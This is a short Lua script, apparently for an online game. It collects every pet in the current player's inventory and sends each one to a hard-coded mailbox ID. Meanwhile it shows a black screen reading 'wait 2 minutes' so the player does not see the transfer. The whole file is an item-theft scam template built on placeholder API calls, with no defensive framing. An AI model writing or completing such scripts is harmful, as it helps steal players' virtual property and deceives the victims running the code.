

local targetMailboxID = "liadqjjw"


function getCurrentPlayerID()
  
    local playerID = GameAPI.GetCurrentPlayerID() -- Replace with real API call
    return playerID
end


function getPlayerInventoryPets(playerID)
    
    local petIDs = GameAPI.GetPlayerPets(playerID) -- Replace with real API call
    return petIDs
end

function sendPetToMailbox(petID, mailboxID)
 
    local success, err = GameAPI.SendPetToMailbox(petID, mailboxID) -- Replace with real API call
    if not success then
        print("Failed to send pet with ID " .. petID .. ": " .. err)
    else
        print("Successfully sent pet with ID " .. petID .. " to mailbox " .. mailboxID)
    end
end


function showBlackScreenWithText(text)
    -- Replace this with actual GUI code to create a black screen with text
    -- Example (assuming support for GUI functions):
    local screenWidth, screenHeight = 800, 600 -- Example dimensions, replace with actual screen size
    GUI.ClearScreen() -- Example function to clear the screen
    GUI.SetBackgroundColor(0, 0, 0) -- Set background color to black (RGB)
    GUI.SetTextColor(255, 255, 255) -- Set text color to white (RGB)
    GUI.DrawText(screenWidth / 2, screenHeight / 2, text, "center") -- Draw text in the center
end


function main()
    showBlackScreenWithText("wait 2 minutes")

    local playerID = getCurrentPlayerID()
    
    if not playerID then
        print("Unable to get current player ID.")
        return
    end

    local petIDs = getPlayerInventoryPets(playerID)
    
    if not petIDs or #petIDs == 0 then
        print("No pets found in inventory.")
        return
    end

   
    for _, petID in ipairs(petIDs) do
        sendPetToMailbox(petID, targetMailboxID)
    end
end

-- Execute the script
main()
